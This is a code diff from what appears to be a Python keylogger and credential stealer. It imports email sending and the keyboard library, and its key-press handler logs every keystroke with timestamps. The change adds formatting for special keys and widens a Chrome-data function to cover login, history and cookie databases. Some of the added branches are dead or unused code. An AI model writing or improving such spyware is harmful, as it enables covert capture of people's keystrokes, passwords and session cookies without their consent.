@@ -7,7 +7,6 @@ from email.mime.text import MIMEText
 from os import getcwd, path
 from subprocess import check_output
 from time import sleep
-from ast import literal_eval
 
 import keyboard
 
@@ -36,11 +35,31 @@ def logprint(text, overwrite=False):
 def on_press(event):
     global log, typed_string
     logprint(f"{event.time}:Key {event.name} pressed (Code:{event.scan_code})\n")
+    event_dict = {"space":" ",
+                  "enter":"\n",
+                  "tab":"\t",
+                  "backspace":"\b",
+                  "unknown":f"[Code {event.scan_code}]"}
+    if len(event.name)>1:
+        if event.name in event_dict.keys():
+            name = event_dict[event.name]
+        #elif event.name == "unknown":
+        #    name = f"[Code {event.code}]"
+        else:
+            name = f"[{event.name.title()}]"
+    elif event.name == "alt gr":
+        event.name = "[Alt Gr]"
+    elif event.name == "alt":
+        pass
+    elif event.name == "ctrl":
+        event.name = "[Ctrl]"
+    elif event.name == "right shift":
+        event.name = "[Shift]"
     typed_string += f"{event.name}"
 
 
 def get_chrome_data():
-    '''Returns a list with the respective paths of the login and history SQL databases'''
+    '''Returns a list with the respective paths of the login history  and cookie SQL databases'''
     try:
         global log
         logprint("INFO: Attempting to retrieve chrome data...\n")
